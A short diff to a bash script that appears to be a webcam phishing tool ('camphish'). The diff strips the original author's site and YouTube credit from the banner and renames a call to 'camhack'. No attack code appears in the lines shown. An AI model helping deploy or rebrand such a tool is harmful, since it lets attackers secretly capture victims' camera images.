@@ -16,7 +16,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"
 
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;77m \n"
 
 printf "\n"
 
@@ -141,7 +141,7 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-camphish
+camhack
 else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
@@ -280,4 +280,5 @@ checkfound
 banner
 dependencies
 camphish
+
 
